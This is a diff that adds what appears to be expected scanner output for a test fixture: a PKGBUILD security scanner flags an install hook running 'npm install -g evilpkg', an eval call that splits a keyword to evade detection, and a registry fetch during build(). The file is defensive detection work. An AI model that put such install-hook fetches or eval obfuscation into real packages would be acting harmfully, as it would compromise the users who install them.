@@ -1,0 +1,36 @@
+
+Scan Results: demo
+============================================================
+
+[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
+    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
+    Location: tests/fixtures/malicious/install-eval-concat/demo.scr:2
+    Code:   npm install -g evilpkg
+    Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
+    Reference: CWE-494
+
+[HIGH] OBF-002 Eval usage
+    Eval can execute obfuscated malicious code
+    Location: tests/fixtures/malicious/install-eval-concat/PKGBUILD:6
+    Code: eval "ins""tall=demo.scr"
+    Recommendation: Avoid eval; use direct commands instead
+    Reference: CWE-95
+
+[MEDIUM] ATOMIC-005 Named npm/bun package fetched during the build (source sidecar)
+    A PKGBUILD function runs `npm/pnpm/yarn/bun install|add <package>` for an explicit package name. The package is fetched from the registry during the build, outside source= and its checksums, and runs its lifecycle scripts. The June 2026 'Atomic Arch' campaign added exactly this to build(). A bare `npm install`, `npm ci` or an install from a local tarball is not reported.
+    Location: tests/fixtures/malicious/install-eval-concat/demo.scr:2
+    Code:   npm install -g evilpkg
+    Recommendation: Vendor the dependency through source= with a checksum (or a lockfile shipped in the tarball) instead of naming a registry package in build().
+    Reference: CWE-494
+
+
+
+============================================================
+Package: demo v1-1
+Scan duration: 27ms
+
+Found 3 issue(s):
+  1 CRITICAL
+  1 HIGH
+  1 MEDIUM
+============================================================
